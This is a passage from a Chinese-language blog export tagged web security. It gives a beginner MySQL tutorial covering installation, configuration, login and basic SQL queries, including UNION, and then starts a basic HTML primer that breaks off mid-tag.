<span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.13 sec<span class="token punctuation">)</span></code></pre><p><strong><code>Mysql</code>安装后需要做的</strong></p><p><code>Mysql</code>安装成功后，默认的<code>root</code>用户密码为空，你可以使用以下命令来创建<code>root</code>用户的密码：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@host<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mysqladmin -u root password "new_password";</span></code></pre><p>现在你可以通过以下命令来连接到<code>Mysql</code>服务器：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@host<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mysql -u root -p</span>Enter password:*******</code></pre><blockquote><p>注意：在输入密码时，密码是不会显示了，你正确输入即可。</p></blockquote><p><strong>Windows 上安装 MySQL</strong></p><p><code>Windows</code> 上安装 <code>MySQL</code> 相对来说会较为简单，最新版本可以在 <code>MySQL</code> 下载 中下载中查看(更详细安装：<code>Windows</code> 上安装 <code>MySQL</code>)。</p><p>点击 <code>Download</code> 按钮进入下载页面，点击下图中的 <code>No thanks, just start my download.</code> 就可立即下载：</p><p>下载完后，我们将 <code>zip</code> 包解压到相应的目录，这里我将解压后的文件夹放在 <code>C:\web\mysql-8.0.11</code> 下。</p><p>接下来我们需要配置下  <code>MySQL</code> 的配置文件</p><p>打开刚刚解压的文件夹 <code>C:\web\mysql-8.0.11</code> ，在该文件夹下创建 <code>my.ini</code> 配置文件，编辑 <code>my.ini</code> 配置以下基本信息：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>client<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 设置mysql客户端默认字符集</span>default-character-set<span class="token operator">=</span>utf8 <span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 设置3306端口</span>port <span class="token operator">=</span> 3306<span class="token comment" spellcheck="true"># 设置mysql的安装目录</span>basedir<span class="token operator">=</span>C:\\web\\mysql-8.0.11<span class="token comment" spellcheck="true"># 设置 mysql数据库的数据的存放目录，MySQL 8+ 不需要以下配置，系统自己生成即可，否则有可能报错</span><span class="token comment" spellcheck="true"># datadir=C:\\web\\sqldata</span><span class="token comment" spellcheck="true"># 允许最大连接数</span>max_connections<span class="token operator">=</span>20<span class="token comment" spellcheck="true"># 服务端使用的字符集默认为8比特编码的latin1字符集</span>character-set-server<span class="token operator">=</span>utf8<span class="token comment" spellcheck="true"># 创建新表时将使用的默认存储引擎</span>default-storage-engine<span class="token operator">=</span>INNODB</code></pre><p><strong>启动 <code>MySQL</code> 数据库：</strong></p><p>以管理员身份打开 <code>cmd</code> 命令行工具，切换目录：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> C:\web\mysql-8.0.11\bin</code></pre><p>初始化数据库：</p><pre class=" language-bash"><code class="language-bash">mysqld --initialize --console</code></pre><p>执行完成后，会输出 root 用户的初始默认密码，如：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">..</span>.2018-04-20T02:35:05.464644Z 5 <span class="token punctuation">[</span>Note<span class="token punctuation">]</span> <span class="token punctuation">[</span>MY-010454<span class="token punctuation">]</span> <span class="token punctuation">[</span>Server<span class="token punctuation">]</span> A temporary password is generated <span class="token keyword">for</span> root@localhost: APWCY5ws<span class="token operator">&amp;</span>hjQ<span class="token punctuation">..</span>.</code></pre><p><code>APWCY5ws&amp;hjQ</code> 就是初始密码，后续登录需要用到，你也可以在登陆后修改密码。</p><p>输入以下安装命令：</p><pre class=" language-bash"><code class="language-bash">mysqld <span class="token function">install</span></code></pre><p>启动输入以下命令即可：</p><pre class=" language-bash"><code class="language-bash">net start mysql</code></pre><blockquote><p>注意: 在 5.7 需要初始化 data 目录：</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> C:\web\mysql-8.0.11\bin mysqld --initialize-insecure</code></pre><p>初始化后再运行 <code>net start mysql</code> 即可启动 <code>mysql</code>。</p><p><strong>登录 MySQL</strong></p><p>当 <code>MySQL</code> 服务已经运行时, 我们可以通过 <code>MySQL</code> 自带的客户端工具登录到 <code>MySQL</code> 数据库中, 首先打开命令提示符, 输入以下格式的命名:</p><pre class=" language-bash"><code class="language-bash">mysql -h 主机名 -u 用户名 -p</code></pre><p>参数说明：</p><ul><li>-h : 指定客户端所要登录的 MySQL 主机名, 登录本机(localhost 或 127.0.0.1)该参数可以省略;</li><li>-u : 登录的用户名;</li><li>-p : 告诉服务器将会使用一个密码来登录, 如果所要登录的用户名密码为空, 可以忽略此选项。</li></ul><p>如果我们要登录本机的 MySQL 数据库，只需要输入以下命令即可：</p><pre class=" language-bash"><code class="language-bash">mysql -u root -p</code></pre><p>按回车确认, 如果安装正确且 <code>MySQL</code> 正在运行, 会得到以下响应:</p><pre class=" language-bash"><code class="language-bash">Enter password:</code></pre><p>若密码存在, 输入密码登录, 不存在则直接按回车登录。登录成功后你将会看到 <code>Welcome to the MySQL monitor...</code> 的提示语。</p><p>然后命令提示符会一直以 <code>mysql&gt;</code> 加一个闪烁的光标等待命令的输入, 输入 <code>exit</code> 或 <code>quit</code> 退出登录。</p><hr><h3 id="0x003-MySQL-的基本认识"><a href="#0x003-MySQL-的基本认识" class="headerlink" title="0x003 MySQL 的基本认识"></a>0x003 MySQL 的基本认识</h3><p><strong>MYSQL 数据库的一些解释</strong></p><blockquote><p>注意：<br>数据库就相当于文件夹<br>表就相当于文件</p></blockquote><p><strong>mysql 注释符有三种</strong></p><ol><li>#…</li><li>“– …”</li><li>/<em>…</em>/</li></ol><hr><h3 id="0x004-MySQL-的基本操作"><a href="#0x004-MySQL-的基本操作" class="headerlink" title="0x004 MySQL 的基本操作"></a>0x004 MySQL 的基本操作</h3><h4 id="1-库的增删改查-sql-语句"><a href="#1-库的增删改查-sql-语句" class="headerlink" title="1. 库的增删改查(sql 语句)"></a>1. 库的增删改查(sql 语句)</h4><ul><li>增：create database db1;</li><li>删：drop database db1;</li><li>改：alter database db1 charset utf8;</li><li>查：show databases;#查看所有的数据库</li></ul><p>查看指定的数据库</p><pre class=" language-bash"><code class="language-bash">show create database db1<span class="token punctuation">;</span></code></pre><p>设置默认的 <code>utf8</code>,在配置文件中：写上 <code>character_set_server = utf8</code></p><p>查看你当前在哪个库</p><pre class=" language-bash"><code class="language-bash">use db2<span class="token keyword">select</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>重命名数据库 </p><pre class=" language-bash"><code class="language-bash">RENAME database olddbname TO newdbname</code></pre><pre class=" language-bash"><code class="language-bash">show status<span class="token punctuation">;</span> -- 显示一些系统特定资源的信息，例如，正在运行的线程数量。desc tabl_name<span class="token punctuation">;</span> 显示表结构，字段类型，主键，是否为空等属性，但不显示外键。show databases 查看这个 mysql 里面有多少个库use mysql use 选择数据库show tables 查看当前库里面所有的表</code></pre><p>查看当前数据库 里面的表 user 用户为 root 的密码</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> password from user where user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span>Mysql 5.7 <span class="token keyword">select</span> authentication_string,user from mysql.user<span class="token punctuation">;</span></code></pre><p>修改 <code>MySQL</code> 数据库字符集为 <code>UTF-8</code></p><pre class=" language-bash"><code class="language-bash">alter database 数据库名 character <span class="token keyword">set</span> utf8<span class="token punctuation">;</span></code></pre><h4 id="2-table-表的操作"><a href="#2-table-表的操作" class="headerlink" title="2. table 表的操作"></a>2. table 表的操作</h4><p><strong>查看表结构</strong></p><pre class=" language-bash"><code class="language-bash">desc tableDESCRIBE 表名</code></pre><p>查看表的所有内容</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">select</span> * from table_name</code></pre><p>建表</p><pre class=" language-bash"><code class="language-bash">CREATE TABLE 表名 <span class="token punctuation">(</span>    属性名 数据类型 <span class="token punctuation">[</span>完整约束条件<span class="token punctuation">]</span>,    属性名 数据类型 <span class="token punctuation">[</span>完整约束条件<span class="token punctuation">]</span>,    <span class="token punctuation">..</span>.    <span class="token punctuation">..</span>.    属性名 数据类型 <span class="token punctuation">[</span>完整约束条件<span class="token punctuation">]</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>字段名就是属性名</p><p>完整的建立表的语句</p><pre class=" language-bash"><code class="language-bash">create table users<span class="token punctuation">(</span>id int<span class="token punctuation">(</span>7<span class="token punctuation">)</span> AUTO_INCREMENT,                username varchar<span class="token punctuation">(</span>100<span class="token punctuation">)</span> not null,                password varchar<span class="token punctuation">(</span>100<span class="token punctuation">)</span> not null,                PRIMARY KEY<span class="token punctuation">(</span>id<span class="token punctuation">)</span>                <span class="token punctuation">)</span>ENGINE<span class="token operator">=</span>InnoDB DEFAULT CHARSET<span class="token operator">=</span>utf8<span class="token punctuation">;</span>                mysql<span class="token operator">></span> create table users<span class="token punctuation">(</span>id int<span class="token punctuation">(</span>7<span class="token punctuation">)</span> UNSIGNED auto_increment,username varchar<span class="token punctuation">(</span>30<span class="token punctuation">)</span> not null,password varchar<span class="token punctuation">(</span>32<span class="token punctuation">)</span> not null,email varchar<span class="token punctuation">(</span>40<span class="token punctuation">)</span>,primary key <span class="token punctuation">(</span>id<span class="token punctuation">))</span>engine<span class="token operator">=</span>myisam default charset<span class="token operator">=</span>utf8<span class="token punctuation">;</span>Query OK, 0 rows affected <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><p><code>if not exists</code> 表示当相同的表名存在时，则不执行此创建语句，避免语句执行错误</p><pre class=" language-bash"><code class="language-bash">create database <span class="token keyword">if</span> not exists <span class="token punctuation">[</span>table<span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p><code>ENGINE</code> 设置表的引擎和默认的字符类型</p><pre class=" language-bash"><code class="language-bash">ENGINE<span class="token operator">=</span>InnoDB DEFAULT CHARSET<span class="token operator">=</span>utf8<span class="token punctuation">;</span></code></pre><p>常见的数据库引擎</p><p>InnoDB myisam</p><p><a href="https://www.cnblogs.com/-xlp/p/8617760.html">数据类型</a></p><p><strong>约束条件</strong></p><ul><li>PRIMARY KEY 标识该属性为该表的主键，可以唯一的标识对应的元组</li><li>FOREIGN KEY 标识该属性为该表的外键，是与之联系某表的主键</li><li>NOT NULL 标识该属性不能为空</li><li>UNIQUE 标识该属性的值是唯一的</li><li>AUTO_INCREMENT 标识该属性的值是自动增加，这是 MySQL 的 SQL 语句特色</li><li>DEFAULT 为该属性设置默认值</li></ul><p><strong>修改表的操作</strong></p><p>修改表</p><pre class=" language-bash"><code class="language-bash">ALTER TABLE 旧表名 RENAME 新表名<span class="token punctuation">;</span></code></pre><p>修改字段的数据类型</p><pre class=" language-bash"><code class="language-bash">ALTER TABLE 表名 MODIFY 属性名 数据类型<span class="token punctuation">;</span></code></pre><p>修改字段名：</p><pre class=" language-bash"><code class="language-bash">ALTER TABLE 表名 CHANGE 旧属性名 新属性名 新数据类型<span class="token punctuation">;</span></code></pre><p>增加字段名</p><pre class=" language-bash"><code class="language-bash">ALTER TABLE 表名 ADD 属性名 1 数据类型 <span class="token punctuation">[</span>完整性约束条件<span class="token punctuation">]</span> <span class="token punctuation">[</span>FIRST <span class="token operator">|</span> AFTER 属性名 2<span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>删除字段</p><pre class=" language-bash"><code class="language-bash">ALTER TABLE 表名 DROP 属性名<span class="token punctuation">;</span></code></pre><p>更改表的存储引擎</p><pre class=" language-bash"><code class="language-bash">ALTER TABLE 表名 ENGINE <span class="token operator">=</span> 存储引擎名<span class="token punctuation">;</span></code></pre><hr><h3 id="0x005-数据的增删改查"><a href="#0x005-数据的增删改查" class="headerlink" title="0x005 数据的增删改查"></a>0x005 数据的增删改查</h3><p>为表中所有字段添加数据</p><p>语法：INSERT INTO 表名(字段名 1，字段名 2，…) VALUES(值 1，值 2，…);</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> insert into users<span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span> values<span class="token punctuation">(</span>1,<span class="token string">'test'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>或者mysql<span class="token operator">></span> insert into <span class="token function">users</span> values<span class="token punctuation">(</span>1,<span class="token string">'test'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span></code></pre><p><strong>增</strong></p><p>语法：INSERT INTO 表名 VALUES(值 11，值 2，…);</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> insert into <span class="token function">users</span> values<span class="token punctuation">(</span>null,<span class="token string">'test'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>语法：INSERT INTO 表名（字段 1，字段 2，…) VALUES(值 1，值 2，…);<br>语法：INSERT INTO 表名 SET 字段名 1=值 1[,字段名 2=值 2，…]</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> INSERT INTO student SET id<span class="token operator">=</span>4,name<span class="token operator">=</span><span class="token string">'zhaoliu'</span>,grade<span class="token operator">=</span>72;</code></pre><p>同时添加多条数据<br>语法：INSERT INTO 表名[(字段名 1，字段名 2，…)] VALUES (值 1，值 2，…),<br>(值 1，值 2，…);</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> insert into <span class="token function">users</span> <span class="token punctuation">(</span>id,username,password<span class="token punctuation">)</span>values<span class="token punctuation">(</span>null,<span class="token string">'moon'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span>,<span class="token punctuation">(</span>null,<span class="token string">'alex'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>语法：INSERT INTO 表名[(字段名 1，字段名 2，…)] VALUES(值 1，值 2，…),<br>(值 1，值 2，…),(值 1，值 2，…);</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> insert into <span class="token function">users</span> values<span class="token punctuation">(</span>null,<span class="token string">'moon1'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span>,<span class="token punctuation">(</span>null,<span class="token string">'alex1'</span>,<span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>删</strong></p><p>语法：DELETE FROM 表名 [WHERE 条件表达式]</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> delete from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span></code></pre><p>删除全部数据</p><p>若 DELETE 语句中没有使用 WHERE 语句，则会将表中所有记录都删除。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> DELETE FROM 表名</code></pre><p>删除全部数据的另一种方法——TRUNCATE</p><p><strong>更新</strong></p><p>语法：UPDATE 表名 SET 字段名 1=值 1，[ 字段名 2=值 2，…][ WHERE 条件表达式 ]</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> update <span class="token function">users</span> <span class="token keyword">set</span> password<span class="token operator">=</span><span class="token string">'aaaa'</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>mysql<span class="token operator">></span> update <span class="token function">users</span> <span class="token keyword">set</span> password<span class="token operator">=</span><span class="token string">'123456'</span>,username<span class="token operator">=</span><span class="token string">'moon'</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span>mysql<span class="token operator">></span> update <span class="token function">users</span> <span class="token keyword">set</span> password<span class="token operator">=</span>456789<span class="token punctuation">;</span></code></pre><p><strong>查</strong></p><p>查询 <code>users</code> 表的所有字段（星号代表所有的字段）</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span></code></pre><p>查询指定的字段</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> username,password from <span class="token function">users</span><span class="token punctuation">;</span></code></pre><p>按条件调节查询<br>语法：SELECT 字段名 1，字段名 2，…FROM 表名 WHERE 条件表达式</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> username,password from <span class="token function">users</span> where id<span class="token operator">=</span>1<span class="token punctuation">;</span></code></pre><p><code>in</code> 查询</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM student2 WHERE <span class="token function">id</span> IN <span class="token punctuation">(</span>1,2,3<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>带 <code>BETWEEN AND</code> 关键字的查询</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where <span class="token function">id</span> not between 1 and 10<span class="token punctuation">;</span></code></pre><p>带 <code>DISTINCT</code> 关键字的查询</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> distinct username from <span class="token function">users</span><span class="token punctuation">;</span></code></pre><p><code>like</code> 查询 一般都会给跟着%</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username like <span class="token string">"%m%"</span><span class="token punctuation">;</span></code></pre><p>下划线 _ 匹配一个字符</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> select* from <span class="token function">users</span> where username like <span class="token string">"moo_"</span></code></pre><p><code>and</code> 查询</p><p>满足多个条件</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">=</span>1 and username<span class="token operator">=</span><span class="token string">'moon'</span><span class="token punctuation">;</span></code></pre><p><code>or</code> 查询</p><p>满足任意一个条件</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">=</span>1 or username<span class="token operator">=</span><span class="token string">'moon'</span><span class="token punctuation">;</span></code></pre><p><code>OR</code> 和 <code>AND</code> 一起使用的情况</p><p><code>OR</code> 和 <code>AND</code> 一起使用的时候，<code>AND</code> 的优先级高于 <code>OR</code>，因此二者一起使用时，<br>会先运算 <code>AND</code> 两边的表达式，再运算 <code>OR</code> 两边的表达式。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">></span>5 and password<span class="token operator">=</span><span class="token string">'123456c'</span> or username<span class="token operator">=</span><span class="token string">'moon1'</span><span class="token punctuation">;</span></code></pre><p>聚合查询</p><p>count 返回行数</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">;</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>id<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">;</span></code></pre><ul><li>COUNT() 返回某列的行数</li><li>SUM() 返回某列值的和</li><li>AVG() 返回某列的平均值</li><li>MAX() 返回某列的最大值</li><li>MIN() 返回某列的最小值</li></ul><p>分组查询</p><p>如果报错请在 <code>my.ini</code> 添加 </p><pre class=" language-bash"><code class="language-bash">sql_mode<span class="token operator">=</span>STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION</code></pre><p>GROUP BY</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> GROUP BY password<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span> 3 <span class="token operator">|</span> moon1 <span class="token operator">|</span> 123456 <span class="token operator">|</span><span class="token operator">|</span> 1 <span class="token operator">|</span> moon <span class="token operator">|</span> 456789 <span class="token operator">|</span>+----+----------+----------+2 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.01 sec<span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> GROUP BY username<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span> 2 <span class="token operator">|</span> alex1 <span class="token operator">|</span> 456789 <span class="token operator">|</span><span class="token operator">|</span> 1 <span class="token operator">|</span> moon <span class="token operator">|</span> 456789 <span class="token operator">|</span><span class="token operator">|</span> 3 <span class="token operator">|</span> moon1 <span class="token operator">|</span> 123456 <span class="token operator">|</span>+----+----------+----------+3 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.01 sec<span class="token punctuation">)</span></code></pre><p>使用 <code>LIMIT</code> 限制查询结果的数量</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> limit 2,10<span class="token punctuation">;</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> as u where u.id<span class="token operator">=</span>1<span class="token punctuation">;</span></code></pre><p>为表和字段取别名</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> username as myname from <span class="token function">users</span><span class="token punctuation">;</span></code></pre><p><strong><code>mysql</code> 的子查询</strong></p><p><code>where</code> 型子查询（把内层查询结果当作外层查询的比较条件）</p><pre><code>mysql&gt; select * from users where id in (select id from users where id&gt;10);</code></pre><p><code>from</code> 型子查询 (把内层的查询结果供外层再次查询)</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token punctuation">(</span>select username,age from users<span class="token punctuation">)</span> as agev_a where age<span class="token operator">></span>20<span class="token punctuation">;</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token punctuation">(</span>select * from <span class="token function">users</span> where id<span class="token operator">>=</span>10<span class="token punctuation">)</span> as age_10<span class="token punctuation">;</span><span class="token punctuation">(</span>select * from <span class="token function">users</span> where id<span class="token operator">>=</span>10<span class="token punctuation">)</span>查询出来的是一个集合,别名为age_10mysql<span class="token operator">></span> <span class="token keyword">select</span> * from age_10<span class="token punctuation">;</span></code></pre><p><code>exists</code>型子查询（把外层查询结果拿到内层，看内层的查询是否成立）</p><p>1<br>0</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where EXISTS <span class="token punctuation">(</span>select * from <span class="token function">users</span> where id<span class="token operator">></span>1<span class="token punctuation">)</span></code></pre><p><strong>联合查询（两个表的查询）</strong></p><blockquote><p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p></blockquote><p>当 <code>ALL</code> 随 <code>UNION</code> 一起使用时（即 <code>UNION ALL</code>），不消除重复行</p><p><code>UNION ALL</code> 查询全部 而且不会消除重复的行</p><p><code>union</code> </p><p><code>SQL UNION ALL</code> 语法</p><blockquote><p>union 的用法及注意事项<br>两次查询的列数必须一致</p></blockquote><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> union <span class="token keyword">select</span> *,1 from news<span class="token punctuation">;</span></code></pre><pre class=" language-bash"><code class="language-bash">CREATE TABLE <span class="token variable"><span class="token variable">`</span>news<span class="token variable">`</span></span> <span class="token punctuation">(</span>     <span class="token variable"><span class="token variable">`</span><span class="token function">id</span><span class="token variable">`</span></span> int<span class="token punctuation">(</span>11<span class="token punctuation">)</span> NOT NULL AUTO_INCREMENT,     <span class="token variable"><span class="token variable">`</span>title<span class="token variable">`</span></span> varchar<span class="token punctuation">(</span>255<span class="token punctuation">)</span> not NULL,     <span class="token variable"><span class="token variable">`</span>content<span class="token variable">`</span></span> varchar<span class="token punctuation">(</span>255<span class="token punctuation">)</span> not null,     PRIMARY KEY <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span><span class="token function">id</span><span class="token variable">`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> ENGINE<span class="token operator">=</span>MyISAM AUTO_INCREMENT<span class="token operator">=</span>0 DEFAULT CHARSET<span class="token operator">=</span>utf8<span class="token punctuation">;</span> insert into news <span class="token punctuation">(</span>title,content<span class="token punctuation">)</span>values<span class="token punctuation">(</span><span class="token string">'a1'</span>,<span class="token string">'a1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr><h3 id="0x006-更多教程"><a href="#0x006-更多教程" class="headerlink" title="0x006 更多教程"></a>0x006 更多教程</h3><p><a href="https://www.runoob.com/mysql/mysql-tutorial.html">MySQL详细教程</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全HTML基础</title>
      <link href="/2022/08/08/toc-heading-2/"/>
      <url>/2022/08/08/toc-heading-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x001-HTML简介"><a href="#0x001-HTML简介" class="headerlink" title="0x001 HTML简介"></a>0x001 HTML简介</h3><hr><p>什么是HTML?</p><ul><li><code>HTML</code> 是用来描述网页的一种语言。</li><li><code>HTML</code> 指的是超文本标记语言: <code>HyperText Markup Language</code></li><li><code>HTML</code> 不是一种编程语言，而是一种标记语言</li><li>标记语言是一套标记标签 (<code>markup tag</code>)</li><li><code>HTML</code> 使用标记标签来描述网页</li><li><code>HTML</code> 文档包含了<code>HTML</code> 标签及文本内容</li><li><code>HTML</code>文档也叫做 <code>web</code> 页面</li></ul><hr><h3 id="0x002-HTML页面架构"><a href="#0x002-HTML页面架构" class="headerlink" title="0x002 HTML页面架构"></a>0x002 HTML页面架构</h3><hr><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span>    <span class="token operator">&lt;</span>head<span class="token operator">></span>        <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token operator">&lt;</span>/title<span class="token operator">></span>    <span class="token operator">&lt;</span>/head<span class="token operator">></span>    <span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p><code>charset</code>常用编码：<code>gbk</code>、<code>gbk2312</code>、<code>utf-8</code></p><hr><h3 id="0x003-HTML常见标签"><a href="#0x003-HTML常见标签" class="headerlink" title="0x003 HTML常见标签"></a>0x003 HTML常见标签</h3><hr><h4 id="1-meta标签"><a href="#1-meta标签" class="headerlink" title="1.meta标签"></a>1.meta标签</h4><p><code>&lt;meta&gt;</code> 元素可提供有关页面的元信息（<code>meta-information</code>），比如针对搜索引擎和更新频度的描述和关键词。<br>设置网站关键字</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"keywords"</span> content<span class="token operator">=</span><span class="token string">"网络安全，WEB 渗透"</span>/<span class="token operator">></span></code></pre><p><code>&lt;link&gt;</code> 标签定义文档与外部资源的关系。<br><code>&lt;script&gt;</code> 引入 <code>js</code> 文件</p><p>注释</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>--这是一段注释。注释不会在浏览器中显示。--<span class="token operator">></span><span class="token operator">&lt;</span>p<span class="token operator">></span>这是一段普通的段落。<span class="token operator">&lt;</span>/p<span class="token operator">></span></code></pre><h4 id="2-标题标签"><a href="#2-标题标签" class="headerlink" title="2.标题标签"></a>2.标题标签</h4><p>由大到小</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>h1<span class="token operator">></span>h1<span class="token operator">&lt;</span>/h1<span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>h2<span class="token operator">&lt;</span>/h2<span class="token operator">></span><span class="token operator">&lt;</span>h3<span class="token operator">></span>h3<span class="token operator">&lt;</span>/h3<span class="token operator">></span><span class="token operator">&lt;</span>h4<span class="token operator">></span>h4<span class="token operator">&lt;</span>/h4<span class="token operator">></span><span class="token operator">&lt;</span>h5<span class="token operator">></span>h5<span class="token operator">&lt;</span>/h5<span class="token operator">></span><span class="token operator">&lt;</span>h6<span class="token operator">></span>h6<span class="token operator">&lt;</span>/h6<span class="token operator">></span></code></pre><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>/br<span class="token operator">></span> 换行标签<span class="token operator">&lt;</span>hr<span class="token operator">></span> 换行线标签</code></pre><h4 id="3-文本属性"><a href="#3-文本属性" class="headerlink" title="3.文本属性"></a>3.文本属性</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>strong<span class="token operator">></span>加粗<span class="token operator">&lt;</span>/strong<span class="token operator">></span><span class="token operator">&lt;</span>b<span class="token operator">></span><span class="token operator">&lt;</span>/b<span class="token operator">></span> 加粗<span class="token operator">&lt;</span>i<span class="token operator">></span><span class="token operator">&lt;</span>/i<span class="token operator">></span> 斜体<span class="token operator">&lt;</span>u<span class="token operator">></span><span class="token operator">&lt;</span>/u<span class="token operator">></span> 下划线<span class="token operator">&lt;</span>sup<span class="token operator">></span><span class="token 